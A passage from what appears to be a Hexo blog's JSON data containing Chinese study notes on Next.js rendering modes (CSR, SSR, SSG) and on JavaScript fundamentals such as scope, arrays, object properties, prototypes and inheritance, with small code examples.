&#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>为了能够让”只执行一次“的需求覆盖不同的事件处理，我们可以将这个需求剥离出来。这个过程，我们成为<strong>过程抽象</strong></p>\n"},{"title":"Next","date":"2023-03-27T10:51:45.000Z","mp3":null,"cover":"img/bg26.jpg","_content":"\n\n# Next\n\n## 一、CSR、SSR、SGR\n\n### 1.基础概念\n\n- B端指内部使用的管理平台\n- C端面向公网外部用户\n\n### 2.CSR客户端渲染\n\n- 常见的B端Web开发模式，前后端分离，服务器压力相对较轻；渲染在客户端进行，服务器直接返回不加工的HTML用户再后续访问操作；\n- SPA：所需的资源在一起请求中就加载完成，不需要动态加载，首屏时间更长；\n\n### 3.SSR服务端渲染\n\n- 从原先的JSP/PHP就已经体现了服务端渲染；代码耦合度高，且模板语言混杂编程语言，对于一些复杂的功能，维护较为痛苦；这种模式下JAVA，PHP复杂渲染的逻辑，而前端只负责UI和交互；\n\n### 4.同构SSR\n\n- BFF：backend For Frontend 服务于前端应用的后端\n- 前后端一体化，一套React代码在服务器上运行一遍，到达浏览器又运行一遍；\n- 前后端都需要参与渲染，而且首次渲染出的HTMl要一样；\n\n![](https://s3.bmp.ovh/imgs/2023/02/01/b73d6eab9d1b5bc2.jpg)\n\n### 5.SSG静态站点生成\n\n- 在构建的时候直接把结果网页输出到磁盘，每次访问直接把HTML返回给客户端，相当于一个静态资源；\n- CDN：建立并覆盖在Internet尚，由分布在不同区域的边缘节点服务器组成的分布式网络；\n- 相较于SSR，因为不需要每次请求都有服务器处理，所以可以大幅减轻服务器端的压力；\n- 缺陷在于无法生成与用户有关的内容，也就是所有的用户访问的页面是相同的（作为展示）；\n\n\n\n```\nSSR、SSG的优势：\n因为不需要请求大量的JS文件，这就使得SSR/SSG可以拥有更短的首屏时间；\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/01/b9d61a89d2aef5dd.jpg)\n\n## 二、NextJS\n\n### 1.React的SSR\n\n基于React提供的相关服务端渲染API实现，过程比较繁琐重复，因此迫切需要一个封装好的服务端渲染；\n\n![](https://s3.bmp.ovh/imgs/2023/02/01/d6148345e5c705e2.jpg)\n\n### 2.NextJS\n\n- 构建与NodeJS尚的开源Web框架，支持基于React的Web应用程序功能，例如服务端渲染和生成静态网站；\n\n### 3.使用\n\n```shell\nnpx create-next-app@latest --typescript\n```\n\n后面的看不懂，建议先看Next官网了解；\n\n\n\n\n\n\n\n","source":"_posts/NextJS.md","raw":"---\ntitle: Next\ndate: 2023-03-27 18:51:45\ncategories: \n    - 前端\ntags: \n    - Nuxt\n    - 笔记\nmp3: \ncover: img/bg26.jpg\n---\n\n\n# Next\n\n## 一、CSR、SSR、SGR\n\n### 1.基础概念\n\n- B端指内部使用的管理平台\n- C端面向公网外部用户\n\n### 2.CSR客户端渲染\n\n- 常见的B端Web开发模式，前后端分离，服务器压力相对较轻；渲染在客户端进行，服务器直接返回不加工的HTML用户再后续访问操作；\n- SPA：所需的资源在一起请求中就加载完成，不需要动态加载，首屏时间更长；\n\n### 3.SSR服务端渲染\n\n- 从原先的JSP/PHP就已经体现了服务端渲染；代码耦合度高，且模板语言混杂编程语言，对于一些复杂的功能，维护较为痛苦；这种模式下JAVA，PHP复杂渲染的逻辑，而前端只负责UI和交互；\n\n### 4.同构SSR\n\n- BFF：backend For Frontend 服务于前端应用的后端\n- 前后端一体化，一套React代码在服务器上运行一遍，到达浏览器又运行一遍；\n- 前后端都需要参与渲染，而且首次渲染出的HTMl要一样；\n\n![](https://s3.bmp.ovh/imgs/2023/02/01/b73d6eab9d1b5bc2.jpg)\n\n### 5.SSG静态站点生成\n\n- 在构建的时候直接把结果网页输出到磁盘，每次访问直接把HTML返回给客户端，相当于一个静态资源；\n- CDN：建立并覆盖在Internet尚，由分布在不同区域的边缘节点服务器组成的分布式网络；\n- 相较于SSR，因为不需要每次请求都有服务器处理，所以可以大幅减轻服务器端的压力；\n- 缺陷在于无法生成与用户有关的内容，也就是所有的用户访问的页面是相同的（作为展示）；\n\n\n\n```\nSSR、SSG的优势：\n因为不需要请求大量的JS文件，这就使得SSR/SSG可以拥有更短的首屏时间；\n```\n\n![](https://s3.bmp.ovh/imgs/2023/02/01/b9d61a89d2aef5dd.jpg)\n\n## 二、NextJS\n\n### 1.React的SSR\n\n基于React提供的相关服务端渲染API实现，过程比较繁琐重复，因此迫切需要一个封装好的服务端渲染；\n\n![](https://s3.bmp.ovh/imgs/2023/02/01/d6148345e5c705e2.jpg)\n\n### 2.NextJS\n\n- 构建与NodeJS尚的开源Web框架，支持基于React的Web应用程序功能，例如服务端渲染和生成静态网站；\n\n### 3.使用\n\n```shell\nnpx create-next-app@latest --typescript\n```\n\n后面的看不懂，建议先看Next官网了解；\n\n\n\n\n\n\n\n","slug":"NextJS","published":1,"updated":"2023-03-27T11:04:39.759Z","_id":"clg29vyg60016ao9cau69gibj","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Next\"><a href=\"#Next\" class=\"headerlink\" title=\"Next\"></a>Next</h1><h2 id=\"一、CSR、SSR、SGR\"><a href=\"#一、CSR、SSR、SGR\" class=\"headerlink\" title=\"一、CSR、SSR、SGR\"></a>一、CSR、SSR、SGR</h2><h3 id=\"1-基础概念\"><a href=\"#1-基础概念\" class=\"headerlink\" title=\"1.基础概念\"></a>1.基础概念</h3><ul>\n<li>B端指内部使用的管理平台</li>\n<li>C端面向公网外部用户</li>\n</ul>\n<h3 id=\"2-CSR客户端渲染\"><a href=\"#2-CSR客户端渲染\" class=\"headerlink\" title=\"2.CSR客户端渲染\"></a>2.CSR客户端渲染</h3><ul>\n<li>常见的B端Web开发模式，前后端分离，服务器压力相对较轻；渲染在客户端进行，服务器直接返回不加工的HTML用户再后续访问操作；</li>\n<li>SPA：所需的资源在一起请求中就加载完成，不需要动态加载，首屏时间更长；</li>\n</ul>\n<h3 id=\"3-SSR服务端渲染\"><a href=\"#3-SSR服务端渲染\" class=\"headerlink\" title=\"3.SSR服务端渲染\"></a>3.SSR服务端渲染</h3><ul>\n<li>从原先的JSP/PHP就已经体现了服务端渲染；代码耦合度高，且模板语言混杂编程语言，对于一些复杂的功能，维护较为痛苦；这种模式下JAVA，PHP复杂渲染的逻辑，而前端只负责UI和交互；</li>\n</ul>\n<h3 id=\"4-同构SSR\"><a href=\"#4-同构SSR\" class=\"headerlink\" title=\"4.同构SSR\"></a>4.同构SSR</h3><ul>\n<li>BFF：backend For Frontend 服务于前端应用的后端</li>\n<li>前后端一体化，一套React代码在服务器上运行一遍，到达浏览器又运行一遍；</li>\n<li>前后端都需要参与渲染，而且首次渲染出的HTMl要一样；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/01/b73d6eab9d1b5bc2.jpg\"></p>\n<h3 id=\"5-SSG静态站点生成\"><a href=\"#5-SSG静态站点生成\" class=\"headerlink\" title=\"5.SSG静态站点生成\"></a>5.SSG静态站点生成</h3><ul>\n<li>在构建的时候直接把结果网页输出到磁盘，每次访问直接把HTML返回给客户端，相当于一个静态资源；</li>\n<li>CDN：建立并覆盖在Internet尚，由分布在不同区域的边缘节点服务器组成的分布式网络；</li>\n<li>相较于SSR，因为不需要每次请求都有服务器处理，所以可以大幅减轻服务器端的压力；</li>\n<li>缺陷在于无法生成与用户有关的内容，也就是所有的用户访问的页面是相同的（作为展示）；</li>\n</ul>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs x86asm\">SSR、SSG的优势：<br>因为不需要请求大量的<span class=\"hljs-keyword\">JS</span>文件，这就使得SSR/SSG可以拥有更短的首屏时间；<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/01/b9d61a89d2aef5dd.jpg\"></p>\n<h2 id=\"二、NextJS\"><a href=\"#二、NextJS\" class=\"headerlink\" title=\"二、NextJS\"></a>二、NextJS</h2><h3 id=\"1-React的SSR\"><a href=\"#1-React的SSR\" class=\"headerlink\" title=\"1.React的SSR\"></a>1.React的SSR</h3><p>基于React提供的相关服务端渲染API实现，过程比较繁琐重复，因此迫切需要一个封装好的服务端渲染；</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/01/d6148345e5c705e2.jpg\"></p>\n<h3 id=\"2-NextJS\"><a href=\"#2-NextJS\" class=\"headerlink\" title=\"2.NextJS\"></a>2.NextJS</h3><ul>\n<li>构建与NodeJS尚的开源Web框架，支持基于React的Web应用程序功能，例如服务端渲染和生成静态网站；</li>\n</ul>\n<h3 id=\"3-使用\"><a href=\"#3-使用\" class=\"headerlink\" title=\"3.使用\"></a>3.使用</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npx create-next-app@latest --typescript<br></code></pre></td></tr></table></figure>\n\n<p>后面的看不懂，建议先看Next官网了解；</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Next\"><a href=\"#Next\" class=\"headerlink\" title=\"Next\"></a>Next</h1><h2 id=\"一、CSR、SSR、SGR\"><a href=\"#一、CSR、SSR、SGR\" class=\"headerlink\" title=\"一、CSR、SSR、SGR\"></a>一、CSR、SSR、SGR</h2><h3 id=\"1-基础概念\"><a href=\"#1-基础概念\" class=\"headerlink\" title=\"1.基础概念\"></a>1.基础概念</h3><ul>\n<li>B端指内部使用的管理平台</li>\n<li>C端面向公网外部用户</li>\n</ul>\n<h3 id=\"2-CSR客户端渲染\"><a href=\"#2-CSR客户端渲染\" class=\"headerlink\" title=\"2.CSR客户端渲染\"></a>2.CSR客户端渲染</h3><ul>\n<li>常见的B端Web开发模式，前后端分离，服务器压力相对较轻；渲染在客户端进行，服务器直接返回不加工的HTML用户再后续访问操作；</li>\n<li>SPA：所需的资源在一起请求中就加载完成，不需要动态加载，首屏时间更长；</li>\n</ul>\n<h3 id=\"3-SSR服务端渲染\"><a href=\"#3-SSR服务端渲染\" class=\"headerlink\" title=\"3.SSR服务端渲染\"></a>3.SSR服务端渲染</h3><ul>\n<li>从原先的JSP/PHP就已经体现了服务端渲染；代码耦合度高，且模板语言混杂编程语言，对于一些复杂的功能，维护较为痛苦；这种模式下JAVA，PHP复杂渲染的逻辑，而前端只负责UI和交互；</li>\n</ul>\n<h3 id=\"4-同构SSR\"><a href=\"#4-同构SSR\" class=\"headerlink\" title=\"4.同构SSR\"></a>4.同构SSR</h3><ul>\n<li>BFF：backend For Frontend 服务于前端应用的后端</li>\n<li>前后端一体化，一套React代码在服务器上运行一遍，到达浏览器又运行一遍；</li>\n<li>前后端都需要参与渲染，而且首次渲染出的HTMl要一样；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/01/b73d6eab9d1b5bc2.jpg\"></p>\n<h3 id=\"5-SSG静态站点生成\"><a href=\"#5-SSG静态站点生成\" class=\"headerlink\" title=\"5.SSG静态站点生成\"></a>5.SSG静态站点生成</h3><ul>\n<li>在构建的时候直接把结果网页输出到磁盘，每次访问直接把HTML返回给客户端，相当于一个静态资源；</li>\n<li>CDN：建立并覆盖在Internet尚，由分布在不同区域的边缘节点服务器组成的分布式网络；</li>\n<li>相较于SSR，因为不需要每次请求都有服务器处理，所以可以大幅减轻服务器端的压力；</li>\n<li>缺陷在于无法生成与用户有关的内容，也就是所有的用户访问的页面是相同的（作为展示）；</li>\n</ul>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs x86asm\">SSR、SSG的优势：<br>因为不需要请求大量的<span class=\"hljs-keyword\">JS</span>文件，这就使得SSR/SSG可以拥有更短的首屏时间；<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/01/b9d61a89d2aef5dd.jpg\"></p>\n<h2 id=\"二、NextJS\"><a href=\"#二、NextJS\" class=\"headerlink\" title=\"二、NextJS\"></a>二、NextJS</h2><h3 id=\"1-React的SSR\"><a href=\"#1-React的SSR\" class=\"headerlink\" title=\"1.React的SSR\"></a>1.React的SSR</h3><p>基于React提供的相关服务端渲染API实现，过程比较繁琐重复，因此迫切需要一个封装好的服务端渲染；</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/01/d6148345e5c705e2.jpg\"></p>\n<h3 id=\"2-NextJS\"><a href=\"#2-NextJS\" class=\"headerlink\" title=\"2.NextJS\"></a>2.NextJS</h3><ul>\n<li>构建与NodeJS尚的开源Web框架，支持基于React的Web应用程序功能，例如服务端渲染和生成静态网站；</li>\n</ul>\n<h3 id=\"3-使用\"><a href=\"#3-使用\" class=\"headerlink\" title=\"3.使用\"></a>3.使用</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npx create-next-app@latest --typescript<br></code></pre></td></tr></table></figure>\n\n<p>后面的看不懂，建议先看Next官网了解；</p>\n"},{"title":"Vue笔记","date":"2022-09-11T18:51:45.000Z","mp3":null,"cover":"img/vue.png","_content":"\n# JS高级程序设计\n\n## 一、基础基础基础\n\n### 1.基础语法\n\n- for-in\n\n```js\n//for-in语法是一种精准的迭代语句，可以用来枚举对象的属性；\nfor(property in expression){\n    statement;\n}\n\nfor(var propName in window){\n    document.write(propName);\n}\n```\n\n- with\n\n```js\n//将代码的作用域设置到一个特定的对象中\nwith(expression) statement;\n```\n\n### 2.变量、作用域、内存\n\n- ##### 基本类型和引用类型的值\n\n基本数据类型（可以直接操作保存在变量中的实际的值）：Undefined、NULL、Boolean、Number、String；\n\n引用类型的值是保存在内存中的对象；\n\n与其他语言不同，JS不允许直接访问内存中的位置；在操作对象时，实际操作的是对象的引用；\n\n- ##### 复制变量值\n\n从一个变量向另一个变量复制基本类型和引用类型时存在不同；\n\n复制基本类型会创建基本类型的副本：\n\n![](https://s3.bmp.ovh/imgs/2023/03/03/7a78a945b6267d99.jpg)\n\n当一个变量赋值引用类型的值，同样也会将存储的值复制一份放到新变量分配的空间中国，不同的是，这个值的副本其实是一个指针，而这个指针指向存储在堆中的一个对象；\n\n复制结束后，两个变量实际上引用同一个对象；因此改变其中一个变量会改变另一个；\n\n![](https://s3.bmp.ovh/imgs/2023/03/03/18376e88b0eb8200.jpg)\n\n- ##### 传递参数\n\nES中所有的参数都是按值传递的；\n\n```js\nfunction add(num){\n    num+=10;\n    return num;\n}\n\nvar count=20;\nvar result=add(count);\n\n//result=30,count=20不变\n//这是因为addTen()中的参数num是count的值传递，而不是引用传递两者是相互无关的。\n```\n\n- 检测类型\n\n要检测一个变量是不是基本类型？（typeof)\n\n检测基本数据类型时，typeof很好用，但是检测引用类型用处不大，需要使用instanceof;\n\n```js\ntpyeof s;\nvariable instanceof constructor\n```\n\n- 作用域\n\nWeb浏览器中，全局执行环境被认为是window对象；\n\n每个函数都有自己的执行环境，当执行流进入一个函数时，函数的环境会被推入一个环境栈中；\n\n代码在一个环境中执行时，会创建变量对象的一个作用域链（scope chanin）：其作用是为了保证对执行环境有权访问的所有变量和函数有序的访问；\n\n- 延长作用域链\n\n有些语句可以在作用域链的前端临时增加一个变量对象，该变量对象在代码执行后被移除；\n\n```\ntry-catch语句的catch\nwith语句\n```\n\n### 3.垃圾收集\n\nJS具有自动垃圾收集机制，执行环境会负责管理代码执行过程中使用的内存。\n\n原理：找出不再使用的变量，释放内存；垃圾收集器按照固定时间间隔周期性执行；\n\n- 标记清除\n\n当变量进入环境，标记为进入环境，方法可能是设置标志位；\n\n- 引用计数\n\n记录每个值被引用的次数，当声明了一个变量并且将一个引用类型赋给该变量，则这个值的引用次数就是1；\n\n一个值赋给一个变量，引用次数+1；相反对这个值引用的变量右取得了另一个值，则引用次数-1；\n\n问题：\n\n```js\nfunction problem(){\n    var objA=new Object();\n    var objB=new object();\n    \n    objectA.someOtherObject=objectB;\n    objectA.anotherObject=objectA;\n}\n```\n\nObjectA和B通过各自的属性相互引用，两个对象的引用次数都是2；\n\n这会导致函数执行后继续存在，引用次数永远不会为0；\n\n```js\n//解决方法\nobjA.someOther..=null;\nobjB.ano..=null;\n```\n\n- 性能问题\n- 引用解除\n\n```js\nfunction createPerson(name){ \n var localPerson = new Object(); \n localPerson.name = name; \n return localPerson; \n} \nvar globalPerson = createPerson(\"Nicholas\"); \n// 手工解除 globalPerson 的引用\nglobalPerson = null; \n\n```\n\n### 4.引用类型\n\n- 使用对象\n- 创建、操作数组\n- 理解基本的JS类型\n- 使用基本类型和基本包装类型\n\n> 引用类型的值（对象）是引用类型的一个实例；\n\n- ##### Object类型\n\n```js\n//创建Object实例\n//1.new操作符后跟Object构造函数\nvar person=new Object();\nperson.name=\"Martin\";\nperson.age=29;\n\n//2.对象字面量表示法\nvar person={\n    name:\"Martin\",\n    age:29,\n    \"address\":\"江苏省东南大学\"\t\t\t//属性名可以使用字符串，最后一个属性后不加逗号，会在早的版本导致错误\n}\n\n\n```\n\n- ##### Array类型\n\n```js\n//ES的数组每一项可以保存不同类型的数据；大小动态调整；\n\n//创建方式\n//1.Array构造函数；\nvar colors=new Array(20);\nvar colors=new Array(\"red\",\"blue\",\"yellow\");\n//也可以省略new\nvar colors=Array(3);\n\n//2.数组字面量表示法 \nvar colors=[\"red\",\"blue\",\"yellow\"];\n\nvar nums=[1,2,]\t\t//不要这样！！！\nvar options=[，，，] //不要这样；\n\n//添加元素\ncolor[color.length]=\"black\";\n\n//检测数组instanceof 问题在于如果存在两个不同的Array构造函数，会出错；\nif(value instanceof Array){\n    ...\n}\n    \n//更好的方法\nif(Array.isArray(value)){\n    ...\n}\n```\n\n```js\n//转换方法\nvar colors = [\"red\", \"blue\", \"green\"]; // 创建一个包含 3 个字符串的数组\nalert(colors.toString()); // red,blue,green \nalert(colors.valueOf()); // red,blue,green \nalert(colors); // red,blue,green。由于 alert()要接收字符串参数，所以它会在后台调用 toString()方法，由此会得到与直接调用 toString()方法相同的结果\n\n//栈方法\narray.push();\t\t//尾部压入\narray.pop();\t\t//尾部弹出\n\n//队列方法\narray.push();\t\t//尾部入队\narray.shift();\t\t//首部出队\narray.unshift();\t//首部入队\n\n//重排序方法\narray.sort();\t\t//升序排列，方法会调用每个数组项的 toString()转型方法，然后比较得到的字符串\narray.reverse();\t//反转数组\n\n//sort方法可以接受一个比较函数\nfunction compare(value1, value2) { \n if (value1 < value2) { \n return 1; \n } else if (value1 > value2) { \n return -1; \n } else { \n return 0; \n } \n} \nvar values = [0, 1, 5, 10, 15]; \nvalues.sort(compare); \nalert(values); // 15,10,5,1,0\n\n```\n\n```js\n//操作方法\n//concat（）方法基于当前数组项创建一个新的数组；\nvar colors=[\"red\",\"yellow\"];\nvar colors2=colors.concat(\"green\",[\"blue\",\"grey\"]);\n\n//slice（）方法接受一或者两个参数，为岂止位置；\n//slice方法不会影响原始数组；\nvar colors = [\"red\", \"green\", \"blue\", \"yellow\", \"purple\"]; \nvar colors2 = colors.slice(1); \nvar colors3 = colors.slice(1,4); \n\n//splice()方法\nsplice(0,2);  //删除前两项\nsplice(2,0,\"red\",\"green\")  //从位置2开始插入red,green;\nsplice(2,1,\"red\")\t\t\t//替换第二项为red；\n```\n\n```js\n//位置方法\nindexOf()\t\t\t//从头开始查找\nlastIndexOf()\t\t//从尾部开始查找\n\n\n```\n\n### 5.迭代方法\n\n- every():对数组中的每一项运行给定函数，如果该函数对每一项都返回 true，则返回 true。\n- some()：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true。\n- filter():对数组中的每一项运行给定函数，返回该函数会返回 true 的项组成的数组.\n- foreach():：对数组中的每一项运行给定函数。这个方法没有返回值。\n- map()：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。\n\n### 6.归并方法\n\n```js\n//reduce():从第一项开始遍历；\n//reduceRight():从最后一项开始遍历；\n//接受的参数：prev,next，索引，数组对象\nvar values=[1,2,3,4,5];\n//第一次调用，pre=1.cur=2;第二次：pre=3(1+2的结果)，cur=3\nvar sum=values.reduce(function(prev,cur,index,array)=>{\n                      return prev+cur;\n                      });\nalert(sum);\t\t\t\t//15\n\n```\n\n### 7.正则表达式\n\n\n\n## 二、面向对象的程序设计\n\n- 理解对象属性\n- 理解并创建对象\n- 理解继承\n\n### 1.属性类型\n\n> ES中有两种属性：数据属性和访问器属性\n\n- 数据属性\n\n> 数据属性包含一个数据值的位置，在这个位置可以读取和写入值。\n>\n> 1. Configurable：表示是否能通过delete删除属性从而重新定义属性，能否修改属性的特性，能否把属性修改为访问器属性；默认为true；\n> 2. Enumerable：表示是否可以通过for-in循环返回属性；默认为true;\n> 3. Writable:表示能否修改属性的值；默认为true；\n> 4. Value:数据值，默认为undefined；\n\n```js\nvar person={};\nObjcect.defineProperty(person.\"name\",{\n                       configuable:false,\t\t//一旦设置为false,就不能变回可配置的了；\n                       writable:false,\n                       value:\"Martin\"，\n                       });\nconsole.log(person.name);\t\t//\"Martin\"\nperson.name=\"Jack\";\t\t\t\t//无法修改，非严格模式下赋值会被忽略；严格模式下，抛出错误；\n```\n\n- 访问器属性\n\n> 不包含数据值，包含一对儿~~\n>\n> getter()和setter();\n>\n> 1. configurable:表示是否能通过delete删除属性从而重新定义属性，能否修改属性的特性，能否把属性修改为访问器属性；默认为true；\n> 2. Enumerable：表示是否可以通过for-in循环返回属性；默认为true;\n> 3. Get:读取属性时调用，默认undefined；\n> 4. Set:写入属性时调用，默认undefined；\n\n```js\nvar book={\n    _year:2004,\t\t\t//前置下划线表示只可以通过对象方法访问；\n    edition:1\n};\n\nObjcect.defineProperty(book,\"year\",{\n    get:function(){\t\t\t\t\t\t//只写getter意味着不能写，写入会被忽略；严格模式报错；\n        return this._year;\n    },\n    set:function(newValue){\n        if(newValue>2004){\n            this._year=newValue;\n            this.edition+=newValue-2004;\n        }\n    }\n});\n\n//定义多个属性\nObject.defineProperties(book,{\n    _year:{\n        value:2004,\n    },\n    edition:{\n        value:1\n    },\n    year:{\n       get:function(){\t\t\t\t\t\t//只写getter意味着不能写，写入会被忽略；严格模式报错；\n        return this._year;\n        },\n        set:function(newValue){\n            if(newValue>2004){\n                this._year=newValue;\n                this.edition+=newValue-2004;\n            }\n        }\n    }\n})\n\n```\n\n```js\n//读取属性的特性\nvar year=Object.getOwnPropertyDescriptor(book,\"_year\");\nconsole.log(year.value);\n```\n\n### 2.创建对象\n\n> 工厂模式抽象了具体创建对象的过程，考虑到ES中无法创建类，开发人员就发明了一i中函数\n\n##### 工厂模式\n\n```js\nfunction createPerson(name,age,job){\n    var o=new Objcet();\n    o.name=name;\n    o.age=age;\n    o.job=job;\n    o.sayName=function(){\n        console.log(this.name);\n    };\n    return o;\n}\n```\n\n> 工厂模式虽然解决了创建多个相似对象的问题，但是没有解决对象识别的问题，无法知道一个对象的类型；\n\n##### 构造函数模式\n\n> ES中的构造函数能船舰特定类型的对象；\n>\n> 像Object和Array这样的原生构造函数，运行时会自动出现再执行环境；\n\n```js\nfunction Person(name,age,job){\n    this.name=name;\n    this.age=age;\n    this.job=job;\n    \n    this.sayName=function(){\n        console.log(this.name);\n    }\n}\n```\n\n除了相同部分，有如下区别：\n\n- 没有显式的创建对象；\n- 直接将属性和方法赋给了this对象；\n- 没有return；\n\nNote：构造函数使用应该使用首字母大写的开头，非构造函数小写字母开头；\n\n```js\n//要创建Person实例，需要使用new\nlet newPerson=new Person(\"Martin\",18,\"Programmer\");\nconsole.log(newPerson.constructor==Person);   //true\nconsole.log(newPerson instanceof Person);\t//true\n```\n\n> 创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；\n>\n> 构造函数虽然好用，但是也不是没有缺点。\n>\n> 主要问题是：每个方法都要再实例上重新创建一遍；\n>\n> 不同实例创建相同函数名的函数，会导致不同的作用域链和标识符解析。\n>\n> 创建相同的Function实例完全没有必要，况且有this对象在根本不用在执行代码前九八函数绑定到特定的对象上面；\n\n```js\n//优化方法\nfunction Person(name,age){\n    this.name=name;\n    this.age=age;\n    \n    this.sayName=sayName;\n}\n\nfunction sayName(){\n    console.log(this.name);\n}\n```\n\n> 构造函数内部将sayName属性设置成全局的sayName函数。\n>\n> 新的问题：虽然方法定义在全局作用域，但实际上只能被某个对象调用，让全局作用域名不副实；\n>\n> 更进一步，如果一个对象需要定义很多方法，则需要定义多个全局函数，失去封装性；\n\n##### 原型模式\n\n> 我们创建的每个函数都有一个prototype属性，这个属性是一个指针，指向一个对象。\n>\n> Prototype就是通过调用构造函数而创建的那个对象实例的原型对象；\n>\n> 使用原型对象的好处是可以让所有对象实例共享它所包含的属性和方法，即不用再构造函数中定义对象实例的信息，而是将这些信息直接添加到原型对象中；\n\n```js\nfunction Person(){\n    \n}\n\nPerson.prototype.name=\"Martin\";\nPerson.prototype.age=23;\nPerson.prototype.sayName=function(){\n    console.log(this.name);\n};\n\nvar person1=new Person();\nvar person2=new Person();\nperson1.name=\"Martin\"\nperson2.name=\"Jack\"\nperson1.sayName();   //\"Martin\"\nperson2.sayName();\t//\"Jack\"\n\nconsole.log(person1.sayName()==person2.sayName())\t//true\n```\n\n##### 理解原型对象\n\n> 无论什么时候，只要创建了新韩淑，会为这个函数创建一个prototype属性，这个属性指向函数的原型对象。\n>\n> 默认情况下，所有原型对象都会自动获得一个constructor属性，这个属性包含一个指向prototype属性所在函数的指针。\n>\n> 举前面的例子：\n>\n> Person.prototype.constructor指向Person，通过这个构造函数可以伪原型对象添加其他属性；\n\n![](https://s3.bmp.ovh/imgs/2023/03/08/953a324fdcd4fa42.png)\n\n> 当为对象实例添加一个属性时，属性会屏蔽原型对象中保存的同名属性；\n>\n> 原型对象中的属性值不变；只会修改实例中的属性；\n>\n> 使用delete操作符可以完全删除实例属性，达到访问原型属性值的目的；\n>\n> 使用hasOwnProperty()来检查属性值是来自于原型还是实例；\n\n![](https://s3.bmp.ovh/imgs/2023/03/08/b6a6f03230b36450.png)\n\n##### 原型与in操作符\n\n> 有两种方式使用in操作符：单独使用和for-in循环使用；\n>\n> 单独使用：通过对象能返回给定属性时返回true（不论原型和实例）；hasOwnProperty()只适用于实例；\n>\n> tips:如果in返回true而hasOwnProperty()返回false，可以确定属性是原型中的属性；\n>\n> for-in中使用：返回的是通过对象访问的，可以枚举的属性；\n\n```js\n//获得对象上所有的可枚举实例\nobject.keys();\n\nvar p=new Person();\nvar pKeys=Obcject.keys(p);\n```\n\n##### 更简单的原型语法\n\n```js\n//简写prototype\nfunction Person(){}\n\nPerson.prototype={\n    name:\"Martin\",\n    age:29,\n    job:\"Software Engineer\",\n    sayName:function(){\n        alert(this.name);\n    }\n};\n\n//上面的代码里，将Person.prototype设置为一个字面量创建的新对象；但是此时constructor不再指向Person了；\n//每创建一个函数，同时会创建他的prototype对象，这个对象自动获得constructor属性；\nPerson.prototype={\n    constructor:Person,\n    name:\"Martin\",\n    age:29,\n    job:\"Software Engineer\",\n    sayName:function(){\n        alert(this.name);\n    }\n};\n```\n\n##### 组合使用：构造函数模式和原型模式\n\n> 构造函数用于定义实例属性；原型模式用于定义方法和共享属性；\n>\n> 共享方法，但是每个实例有自己的属性副本；\n\n```js\nfunction Person(name, age, job){ \n this.name = name; \n this.age = age; \n this.job = job; \n this.friends = [\"Shelby\", \"Court\"]; \n} \nPerson.prototype = { \n constructor : Person, \n sayName : function(){ \n alert(this.name); \n } \n} \n```\n\n##### 动态原型模式\n\n> 通过将所有信息封装到构造函数，再构造函数中初始化原型；\n\n```js\nfunction Person(name, age, job){ \n this.name = name; \n this.age = age; \n this.job = job; \n    if(typeof this.sayName!=\"function\"){\n        Person.prototype.sayName=function(){\n            alert(this.name);\n        }\n    }\n} \n```\n\n##### 寄生构造函数\n\n```js\nfunction Person(name, age, job){ \n var o = new Object(); \n o.name = name; \n o.age = age; \n o.job = job; \n o.sayName = function(){ \n alert(this.name); \n }; \n return o; \n} \nvar friend = new Person(\"Nicholas\", 29, \"Software Engineer\"); \nfriend.sayName(); //\"Nicholas\" \n```\n\n### 3.继承\n\n- 接口继承：只继承方法签名；\n- 实现继承：继承实际方法；\n\nES只支持实现继承，主要依靠原型链实现；\n\n#### （1）原型链\n\n> 利用原型让一个引用类型继承另一个引用类型的属性和方法；\n\n```js\n//原型链基本模式\n\nfunction SuperType(){\n    this.property=true;\n}\n\nSuperType.prototype.getSuperValue=function(){\n    return this.property;\n};\n\nfunction SubType(){\n    this.subproperty=false;\n}\n\nSubType.prototype=new SuperType();\t\t//子类的原型是父类的实例；子类获得父类的所有属性和方法；\n\nSubType.prototype.getSubValue=function(){\n    return this.subproperty;\n};\n\nvar instacne=new SubType();\nconsole.log(instacne.getSuperValue());\t\t//true;\n```\n\n![](https://s3.bmp.ovh/imgs/2023/03/11/606aeed6b87048a8.png)\n\n- 别忘记默认的原型\n\n> 所有引用类型都默认继承Object；\n\n![](https://s3.bmp.ovh/imgs/2023/03/11/ccdc684bf208d6d1.png)\n\n- 确定原型和实例的关系\n\n```js\ninstance instanceof Object;\nObjcet.prototype.isPrototypeOf(instance);\n```\n\n- 谨慎的定义代码\n\n> 子类优势需要重写超类中的某个方法，或者添加超累不存在的某个方法；\n>\n> 不管怎样，给原型添加的代码一定要放在替换原型语句之后；\n\n```js\nfunction SuperType(){ \n this.property = true; \n} \nSuperType.prototype.getSuperValue = function(){ \n return this.property; \n}; \nfunction SubType(){ \n this.subproperty = false; \n} \n\n//继承了 SuperType \nSubType.prototype = new SuperType(); \n//!!!!添加新方法\nSubType.prototype.getSubValue = function (){ \n return this.subproperty; \n}; \n//重写超类型中的方法\nSubType.prototype.getSuperValue = function (){ \n return false; \n}; \nvar instance = new 